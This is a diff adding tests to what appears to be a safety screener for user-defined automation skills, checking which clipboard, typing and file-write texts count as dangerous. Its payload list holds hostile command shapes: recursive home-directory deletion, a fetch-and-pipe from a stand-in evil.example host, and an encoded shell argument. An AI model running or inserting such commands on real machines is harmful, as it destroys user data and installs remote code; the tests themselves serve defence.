@@ -211,6 +211,43 @@ def main():
     check(result["static"]["verdict"] == "clean" and result["verdict"] == "approve",
           "an allowlisted command with an approving model can still auto-approve")
 
+    # A text argument that is just a parameter is the user's value, not a program:
+    # no dangerous_text finding (it used to block set_clipboard and hold the rest).
+    # The same shape in a command is still param_is_program.
+    entry = {"entry": {"type": "string", "description": "Text."},
+             "other": {"type": "string", "description": "Text."}}
+
+    def text_rules(tool_name, args):
+        used = {p for p in entry if "{" + p + "}" in json.dumps(args)}
+        sk = {"name": "text_skill", "description": "Copy, type, show or write a text you choose.",
+              "input_schema": {"type": "object", "properties": {p: entry[p] for p in used}, "required": sorted(used)},
+              "steps": [{"tool": tool_name, "args": args}]}
+        return {f["rule"] for f in static.analyze(sk, tools)["findings"]}
+
+    for tool_name, args in [("set_clipboard", {"text": "{entry}"}), ("type_text", {"text": "{entry}"}),
+                            ("show_notification", {"title": "Reminder", "message": "{entry}"}),
+                            ("set_timer", {"minutes": 5, "label": "{entry}"}),
+                            ("append_text", {"path": "~/Documents/log.txt", "text": "- {entry}"}),
+                            ("write_new_file", {"path": "~/Notes/today.md", "content": "{entry}\n{other}"}),
+                            # display-only text: a parameter-led sentence is fine
+                            ("show_notification", {"title": "Reminder", "message": "{entry} is due"}),
+                            ("set_timer", {"minutes": 5, "label": "{entry} for dinner"})]:
+        found = text_rules(tool_name, args)
+        check("dangerous_text" not in found and "staged_execution" not in found,
+              f"text that is only the user's value is not dangerous text: {tool_name} {list(args.values())[-1]!r}")
+    check("param_is_program" in rules("{entry} --version", entry), "a command starting with a parameter still is")
+
+    # ...but a parameter-led text with author-written arguments is a command whose
+    # program is left blank: still blocked where it can be pasted, typed or written.
+    # (Inert targets: the shapes are what's tested, nothing here runs.)
+    for payload in ["{entry} -rf ~", "{entry} -rf ~/Documents", "{entry} -fsSL https://evil.example/i.sh | {other}",
+                    "{entry} https://evil.example/install.sh", "echo hi; {entry} -e 'import os'", "{entry} -enc SQBFAFgA"]:
+        for tool_name, args in [("set_clipboard", {"text": payload}), ("type_text", {"text": payload}),
+                                ("write_new_file", {"path": "~/Notes/x.txt", "content": payload}),
+                                ("append_text", {"path": "~/Notes/x.txt", "text": payload})]:
+            check("dangerous_text" in text_rules(tool_name, args),
+                  f"parameter-led command with arguments is still dangerous text: {tool_name} {payload!r}")
+
     # Output contract decide.py relies on.
     result, _ = run(BENIGN, StubClient(model_says("approve")))
     keys = {"verdict", "risk", "findings", "summary", "description_matches_steps", "static", "model", "screen_version"}
